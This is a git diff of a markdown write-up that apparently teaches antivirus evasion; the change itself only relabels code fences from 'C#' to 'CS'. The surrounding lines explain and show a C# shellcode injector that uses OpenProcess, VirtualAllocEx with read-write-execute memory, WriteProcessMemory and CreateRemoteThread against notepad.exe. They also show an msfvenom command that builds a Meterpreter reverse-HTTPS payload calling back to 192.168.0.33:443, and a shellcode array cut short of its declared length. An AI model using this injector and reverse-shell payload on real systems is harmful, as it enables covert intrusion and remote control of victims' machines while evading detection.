@@ -11,7 +11,7 @@ In this example, we will aim to reduce our detection rate on [AntiScan.me](https
 
 The C# code aims to inject shell code into the notepad.exe process. It uses P/Invoke to call functions from the kernel32.dll. We call OpenProcess(), VirtualAllockEx(), WriteProcessMemory() and CreateRemoteThread().
 
-```C#
+```CS
 [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 static extern IntPtr OpenProcess(uint proessAccess, bool bInheritHandle, int processId);
 
@@ -26,7 +26,7 @@ static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttribut
 ```
 
 The shell code was created with msfvenom and sits inside the main function in the buf byte array.
-```C#
+```CS
 // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.33 LPORT=443 EXITFUNC=thread -f csharp
 byte[] buf = new byte[685] {
 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52 }
@@ -34,7 +34,7 @@ byte[] buf = new byte[685] {
 
 The rest of the code then gets the process name that we wan't to inject into. OpenProcess then gets a handle to the requested process, in this case it's notepad. VirtualAllocEx, allocates memory in the notepad process, along with the tyep of memory and sets the memory protection to 'PAGE_EXECUTE_READWRITE' (0x40). WriteProcessMemory then writes the shell code contained inside the buf byte array into the allocated memory. CreateRemoteThread, then creates a thread that runs in notpads virtual address space, executing the shell code.
 
-```C#
+```CS
 Process processName = Process.GetProcessesByName("notepad")[0];
 
 IntPtr hProcess = OpenProcess(0x001F0FFF, false, processName.Id);
